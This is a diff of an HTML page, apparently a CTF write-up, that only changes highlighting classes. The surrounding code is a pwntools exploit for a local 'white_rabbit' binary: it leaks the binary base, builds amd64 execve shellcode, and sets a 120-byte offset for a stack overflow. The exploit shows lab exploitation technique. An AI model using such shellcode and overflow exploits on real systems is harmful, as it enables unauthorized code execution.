@@ -197,7 +197,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./white_rabbit"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
 shell.recvuntil(</span><span class="no">b</span><span class="s">"> "</span><span class="p">)
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1180</span><span class="p">  
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1180</span><span class="p">  
 
 log.info(</span><span class="no">f</span><span class="s">"Binary base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)
 
@@ -330,7 +330,7 @@ JMP Instructions
 shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./white_rabbit"</span><span class="p">)
 
 shell.recvuntil(</span><span class="no">b</span><span class="s">"> "</span><span class="p">)
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1180  </span><span class="p">
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1180  </span><span class="p">
 
 shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
     push 0x3b                 # execve()
@@ -346,7 +346,7 @@ shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class
     pop rsi                   # $rsi = NULL
 
     syscall                   # system call
-"""</span><span class="p">, </span><span class="am">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+"""</span><span class="p">, </span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
 
 offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(shellcode))
